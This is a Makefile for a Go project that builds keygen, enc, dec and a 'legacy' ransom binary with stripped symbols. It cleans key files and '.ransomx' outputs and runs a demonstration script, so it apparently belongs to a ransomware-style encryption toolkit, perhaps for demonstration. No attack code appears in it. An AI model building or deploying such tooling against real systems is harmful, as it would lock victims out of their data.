.PHONY: all build clean test keygen enc dec ransom

GOFLAGS := -ldflags="-s -w"
BUILD_DIR := bin

all: build

build: keygen enc dec ransom

keygen:
	@echo "Building keygen..."
	@go build $(GOFLAGS) -o $(BUILD_DIR)/keygen cmd/keygen/main.go

enc:
	@echo "Building enc..."
	@go build $(GOFLAGS) -o $(BUILD_DIR)/enc cmd/enc/main.go

dec:
	@echo "Building dec..."
	@go build $(GOFLAGS) -o $(BUILD_DIR)/dec cmd/dec/main.go

ransom:
	@echo "Building ransom (legacy)..."
	@go build $(GOFLAGS) -o $(BUILD_DIR)/ransom cmd/ransom/main.go

clean:
	@echo "Cleaning..."
	@rm -rf $(BUILD_DIR)/*
	@rm -f *.key *.pem *.ransomx

test:
	@echo "Running tests..."
	@go test -v ./...

demo: build
	@echo "Running demonstration..."
	@./demonstrate.sh